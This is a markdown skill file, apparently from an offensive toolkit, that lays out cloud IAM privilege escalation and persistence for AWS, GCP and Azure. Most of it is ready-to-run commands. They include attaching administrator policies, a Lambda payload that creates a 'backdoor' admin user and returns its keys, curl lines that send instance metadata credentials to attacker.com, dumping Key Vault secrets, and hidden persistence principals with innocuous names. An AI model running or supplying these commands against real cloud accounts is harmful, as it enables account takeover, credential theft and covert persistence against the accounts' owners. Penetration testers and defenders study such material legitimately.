# /cloud-iam-escalation — Cloud IAM Privilege Escalation Paths

> **Skill type:** Exploitation (Cloud)  
> **Source:** Rhino Security Labs AWS Privesc, GCP Privesc, Azure Privesc research (2024-2025)  
> **Chains into:** `/cloud-security`, `/post-exploit`, `/reporting`  
> **Chained from:** Initial cloud access (keys, SSRF, console)

---

## Purpose

Given any level of cloud access, find the shortest path to admin/root. Covers AWS, GCP, and Azure privilege escalation techniques based on overpermissioned IAM roles.

---

## AWS IAM Privilege Escalation

### Enumeration First

```bash
# What can the current identity do?
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $USER
aws iam list-user-policies --user-name $USER
aws iam list-groups-for-user --user-name $USER

# Enumerate all permissions (requires IAMReadOnlyAccess or similar)
# Tool: enumerate-iam
python3 enumerate-iam.py --access-key AKID --secret-key SECRET

# Pacu — AWS exploitation framework
pacu
run iam__enum_permissions  # Automated permission enumeration
run iam__privesc_scan      # Find escalation paths
```

### Escalation Paths (30+ Known Techniques)

```bash
# Path 1: iam:CreatePolicyVersion
# Create a new policy version with AdministratorAccess
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Path 2: iam:AttachUserPolicy
aws iam attach-user-policy \
  --user-name $CURRENT_USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Path 3: iam:AddUserToGroup (if admin group exists)
aws iam add-user-to-group --user-name $CURRENT_USER --group-name Admins

# Path 4: iam:UpdateAssumeRolePolicy (add self to admin role trust policy)
aws iam update-assume-role-policy --role-name AdminRole \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCOUNT:user/'$CURRENT_USER'"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/AdminRole --role-session-name pwned

# Path 5: lambda:UpdateFunctionCode (inject code into admin Lambda)
# Create malicious Lambda that adds admin user
cat > payload.py << 'EOF'
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    iam.create_user(UserName='backdoor')
    iam.attach_user_policy(UserName='backdoor', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
    keys = iam.create_access_key(UserName='backdoor')
    return keys['AccessKey']
EOF
zip payload.zip payload.py
aws lambda update-function-code --function-name TARGET_FUNCTION --zip-file fileb://payload.zip

# Path 6: ec2:RunInstances + iam:PassRole (run EC2 with admin role)
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdminInstanceProfile \
  --user-data "#!/bin/bash
    TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
    CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$TOKEN)
    curl -d \"$CREDS\" https://attacker.com/steal"

# Path 7: iam:CreateAccessKey (create keys for another user)
aws iam create-access-key --user-name AdminUser

# Path 8: iam:UpdateLoginProfile (set password for admin user)
aws iam update-login-profile --user-name AdminUser --password "NewP@ss1234"

# Path 9: ssm:SendCommand (execute on EC2 with admin role)
aws ssm send-command \
  --targets "Key=tag:Name,Values=AdminServer" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ -o /tmp/creds && curl -d @/tmp/creds https://attacker.com"]'

# Path 10: cloudformation:CreateStack (deploy stack with admin capabilities)
aws cloudformation create-stack \
  --stack-name pwned \
  --template-body file://malicious-template.json \
  --capabilities CAPABILITY_NAMED_IAM
```

---

## GCP Privilege Escalation

```bash
# Enumerate current permissions
gcloud auth list
gcloud projects list
gcloud iam service-accounts list

# Check IAM policy
gcloud projects get-iam-policy PROJECT_ID
gcloud iam service-accounts get-iam-policy SA_EMAIL

# Path 1: iam.serviceAccounts.actAs → impersonate higher-privilege SA
gcloud iam service-accounts add-iam-policy-binding ADMIN_SA \
  --member="serviceAccount:$CURRENT_SA" \
  --role="roles/iam.serviceAccountUser"
# Then use the higher-privilege SA

# Path 2: compute.instances.setServiceAccount → attach admin SA to VM
gcloud compute instances set-service-account INSTANCE \
  --service-account=ADMIN_SA@PROJECT.iam.gserviceaccount.com

# Path 3: resourcemanager.projects.setIamPolicy → add self as owner
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="serviceAccount:$CURRENT_SA" \
  --role="roles/owner"

# Path 4: iam.serviceAccountKeys.create → get SA key
gcloud iam service-accounts keys create key.json \
  --iam-account=ADMIN_SA@PROJECT.iam.gserviceaccount.com

# Path 5: cloudfunctions.functions.update → inject code into admin function
gcloud functions deploy TARGET_FUNCTION \
  --source=./malicious-function/ \
  --runtime python311

# Enumerate SA permissions
gcloud projects get-iam-policy PROJECT_ID --format=json | \
  jq '.bindings[] | select(.members[] | contains("serviceAccount"))'
```

---

## Azure Privilege Escalation

```bash
# Enumerate
az account show
az role assignment list --all
az ad user list
az ad sp list

# Path 1: Azure AD role assignment
az role assignment create \
  --assignee $CURRENT_USER_OBJECT_ID \
  --role "Owner" \
  --scope "/subscriptions/$SUBSCRIPTION_ID"

# Path 2: Managed Identity abuse
# If VM has managed identity with broad permissions:
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"
# Use token for Azure Resource Manager API calls

# Path 3: Azure DevOps pipeline injection
# If access to DevOps pipelines with service connection to Azure:
# Inject malicious step → runs as service principal → escalate

# Path 4: Key Vault access
az keyvault list
az keyvault secret list --vault-name TARGET_VAULT
az keyvault secret show --vault-name TARGET_VAULT --name SECRET_NAME

# Path 5: Storage account access (with Storage Blob Data Contributor)
az storage blob list --account-name STORAGE_ACCOUNT --container-name CONTAINER
az storage blob download --account-name STORAGE_ACCOUNT \
  --container-name CONTAINER --name "credentials.txt" --file creds.txt
```

---

## Cloud Escalation Tools

```bash
# AWS
pacu            # AWS exploitation framework (modular, like Metasploit for AWS)
enumerate-iam   # Brute-force enumerate IAM permissions
cloudmapper     # AWS infrastructure visualization
prowler         # AWS security assessment (blue team use)
scout-suite     # Multi-cloud security assessment

# GCP
gcpwn           # GCP exploitation framework
gcp-iam-privilege-escalation  # Rhino Security Labs toolset

# Azure
azurehound      # Azure BloodHound (find attack paths in Azure AD)
stormspotter    # Azure attack path visualization
microburst      # PowerShell toolkit for Azure attacks

# Multi-cloud
cloudfox        # Multi-cloud attack surface enumeration
```

---

## Cloud Persistence

```bash
# AWS persistence
# Create IAM user with access keys (survives credential rotation)
aws iam create-user --user-name backup-monitor
aws iam attach-user-policy --user-name backup-monitor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backup-monitor

# Lambda backdoor (persists as serverless function)
# Create Lambda triggered by CloudTrail → notifies when keys are rotated

# GCP persistence
# Create long-lived service account key
gcloud iam service-accounts keys create persistent-key.json \
  --iam-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com

# Azure persistence
# Create service principal with client secret
az ad sp create-for-rbac --name backdoor --role Owner \
  --scopes /subscriptions/$SUBSCRIPTION_ID
```
